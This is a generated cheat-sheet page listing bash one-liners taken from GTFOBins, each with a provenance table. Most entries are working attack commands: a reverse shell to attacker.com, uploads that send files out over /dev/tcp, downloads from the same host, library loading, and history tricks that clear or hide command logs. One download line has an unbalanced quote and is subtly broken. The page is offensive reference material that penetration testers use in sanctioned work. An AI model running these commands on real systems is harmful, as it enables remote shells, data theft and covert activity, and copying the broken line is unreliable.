---
parsed_by: focuslocust
source: commands
type: generated
---
# bash Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## bash

Tool page: [bash](../../tools/linux/bash.md)

### download

```text
bash -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |

### download

```text
bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
bash -c 'echo "$(</path/to/input-file)"'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
HISTTIMEFORMAT=$'\r\e[K'
history -c
history -r /path/to/input-file
history
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
bash -c 'echo DATA >/path/to/output-file'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
HISTIGNORE='history *'
history -c
DATA
history -w /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |

### library-load

```text
bash -c 'enable -f /path/to/lib.so x'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |

### shell

```text
bash
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |

### upload

```text
bash -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |

### upload

```text
bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Evidence | Function example preserved from source parser. |
